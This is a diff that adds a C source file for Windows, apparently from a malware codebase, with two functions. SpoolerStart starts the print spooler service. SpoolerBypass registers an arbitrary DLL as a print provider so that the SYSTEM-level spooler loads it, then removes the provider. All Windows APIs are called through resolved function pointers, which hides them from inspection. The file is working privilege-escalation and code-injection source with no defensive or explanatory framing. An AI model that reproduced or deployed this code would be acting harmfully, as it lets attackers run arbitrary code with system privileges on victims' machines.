@@ -1,0 +1,88 @@
+#include <windows.h>
+#include "ntdll.h"
+#include "utils.h"
+#include "spooler.h"
+#include "splice.h"
+#include "Memory.h"
+#include "GetApi.h"
+#include "Strings.h"
+
+BOOL SpoolerStart()
+{
+	BOOL bRet = FALSE;
+
+	SC_HANDLE hMngr = (SC_HANDLE)pOpenSCManagerA(NULL,NULL,SC_MANAGER_CONNECT);
+	if (hMngr)
+	{
+		SC_HANDLE hServ = (SC_HANDLE)pOpenServiceA(hMngr,"spooler",SERVICE_QUERY_STATUS|SERVICE_START);
+		if (hServ)
+		{
+			if (pStartServiceA(hServ,0,NULL))
+			{
+				for (int i = 0; i < 3; i++)
+				{
+					DWORD dwNeed;
+					SERVICE_STATUS_PROCESS ServStatus = {0};
+
+					if (!pQueryServiceStatusEx(hServ,SC_STATUS_PROCESS_INFO,(LPBYTE)&ServStatus,sizeof(ServStatus),&dwNeed)) break;
+
+					if (ServStatus.dwCurrentState == SERVICE_RUNNING)
+					{
+						bRet = TRUE;
+
+						break;
+					}
+
+					pSleep(2000);
+				}
+			}
+
+			pCloseServiceHandle(hServ);
+		}
+
+		pCloseServiceHandle(hMngr);
+	}
+
+	return bRet;
+}
+
+BOOL SpoolerBypass(LPSTR lpDllName)
+{
+	BOOL bRet = FALSE;
+	PROVIDOR_INFO_1 ProvidorInfo;
+	CHAR chLongName[MAX_PATH];
+	PCHAR chName = MakeMachineID();
+	
+	if ( ! chName )
+		return FALSE;
+	
+	
+	if ( pGetLongPathNameA(lpDllName,chLongName,sizeof(chLongName)/sizeof(chLongName[0])) )
+		lpDllName = chLongName;
+
+	ProvidorInfo.pName = chName;
+	ProvidorInfo.pEnvironment = NULL;
+	ProvidorInfo.pDLLName = lpDllName;
+
+	chName[8] = 0;
+	pAddPrintProvidorA(chName,1,(LPBYTE)&ProvidorInfo);
+
+	if ((DWORD)pGetLastError() == 0x6BA /* RPC_S_SERVER_UNAVAILABL*/)
+	{
+		if ( SpoolerStart() ) 
+		{
+			pAddPrintProvidorA(chName,1,(LPBYTE)&ProvidorInfo);
+		}
+	}
+	
+
+	if ((DWORD)pGetLastError() == ERROR_PROC_NOT_FOUND || (DWORD)pGetLastError() == ERROR_DLL_INIT_FAILED || (DWORD)pGetLastError() == ERROR_MOD_NOT_FOUND)
+	{
+		bRet = TRUE;
+	}
+
+	pDeletePrintProvidorA(NULL,NULL,chName);
+
+	STR::Free( chName );
+	return bRet;
+}
